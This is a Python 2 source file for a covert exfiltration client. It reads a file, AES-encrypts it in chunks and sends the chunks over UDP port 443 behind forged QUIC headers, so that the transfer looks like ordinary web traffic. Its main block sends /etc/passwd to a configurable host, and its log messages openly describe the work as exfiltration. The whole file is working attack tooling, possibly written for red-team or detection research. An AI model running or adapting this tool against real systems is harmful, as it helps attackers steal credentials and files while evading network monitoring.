
import sys
import time
import socket
import struct
import random
import hashlib
import urllib2

from Crypto import Random
from Crypto.Cipher import AES

# from itertools import izip_longest

# Setting timeout so that we won't wait forever
timeout = 2
socket.setdefaulttimeout(timeout)
limit = 256*256*256*256 - 1


def md5(fname):
    hash_md5 = hashlib.md5()
    with open(fname, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def chunkstring(s, n):
    return [ s[i:i+n] for i in xrange(0, len(s), n) ]


class AESCipher(object):

    def __init__(self, key):
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        # enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]


class QUICClient():

    def __init__(self, host, key, port=443, max_size=4096):

        # Params for all class
        self.host = host
        self.port = port
        self.max_size = max_size - 60
        self.AESDriver = AESCipher(key=key)
        self.serv_addr = (host, port)

        # Class Globals
        self.max_packets = 255 # Limitation by QUIC itself.
        self._genSeq()   # QUIC Sequence is used to know that this is the same sequence,
                          # and it's a 20 byte long that is kept the same through out the
                          # session and is transfered hex encoded.
        self.delay = 0.1

        self.sock = None
        if self._createSocket() is 1:               # Creating a UDP socket object
            sys.exit(1)
        self.serv_addr = (self.host, self.port)     # Creating socket addr format

    def _genSeq(self):
        self.raw_sequence = random.getrandbits(64)
        parts = []
        while self.raw_sequence:
            parts.append(self.raw_sequence & limit)
            self.raw_sequence >>= 32

        self.sequence = struct.pack('<' + 'L'*len(parts), *parts)
        # struct.unpack('<LL', '\xb1l\x1c\xb1\x11"\x10\xf4')
        return 0

    def _createSocket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock = sock
            return 0
        except socket.error as e:
            sys.stderr.write("[!]\tFailed to create a UDP socket.\n%s.\n" % e)
            return 1

    def _getQUICHeader(self, count):
        if type(count) is not hex:
            try:
                count_id = chr(count)
            except:
                sys.stderr.write("Count must be int or hex.\n")
                return 1
        else:
            count_id = count

        if count > self.max_packets:
            sys.stderr.write("[-]\tCount must be maximum of 255.\n")
            return 1

        header = "\x0c"                     # Public Flags
        header += self.sequence             # Adding CID
        header += count_id                  # Packet Count
        return header

    def _getFileContent(self, file_path):
        try:
            f = open(file_path, 'rb')
            data = f.read()
            f.close()
            sys.stdout.write("[+]\tFile '%s' was loaded for exfiltration.\n" % file_path)
            return data
        except IOError, e:
            sys.stderr.write("[-]\tUnable to read file '%s'.\n%s.\n" % (file_path, e))
            return 1

    def sendFile(self, file_path):

        # Get File content
        data = self._getFileContent(file_path)
        if data == 1:
            return 1

        # Check that the file is not too big.
        if len(data) > (self.max_packets * self.max_size):
            sys.stderr.write("[!]\tFile is too big for export.\n")
            return 1

        # If the file is not too big, start exfiltration

        # Exfiltrate first packet
        md5_sum = md5(file_path)                                          # Get MD5 sum of file
        packets_count = (len(data) / self.max_size)+1                     # Total packets
        first_packet = self._getQUICHeader(count=0)                       # Get header for first file
        r_data = "%s;%s;%s" % (file_path, md5_sum, packets_count)         # First header
        r_data = self.AESDriver.encrypt(r_data)                           # Encrypt data
        self.sock.sendto(first_packet + r_data, self.serv_addr)           # Send the data
        sys.stdout.write("[+]\tSent initiation packet.\n")

        # encrypted_content = self.AESDriver.encrypt(data)

        # Encrypt the Chunks
        raw_dat = ""
        chunks = []
        while data:
            raw_dat += data[:self.max_size]
            enc_chunk = self.AESDriver.encrypt(data[:self.max_size])
            print len(enc_chunk)
            chunks.append(enc_chunk)
            data = data[self.max_size:]

        i = 1
        for chunk in chunks:
            this_data = self._getQUICHeader(count=i)
            this_data += chunk
            self.sock.sendto(this_data, self.serv_addr)
            time.sleep(self.delay)
            sys.stdout.write("[+]\tSent chunk %s/%s.\n" % (i, packets_count))
            i += 1

        sys.stdout.write("[+]\tFinished sending file '%s' to '%s:%s'.\n" % (file_path, self.host, self.port))
        # self.sequence = struct.pack('<' + 'L'*len(parts), *parts)

        return 0

    def close(self):
        time.sleep(0.1)
        self.sock.close()
        return 0


if __name__ == "__main__":
    client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server
    a = struct.unpack('<LL', client.sequence)                       # Get CID used
    a = (a[1] << 32) + a[0]
    sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)
    client.sendFile("/etc/passwd")                                  # Exfil File
    client.close()                                                  # Close
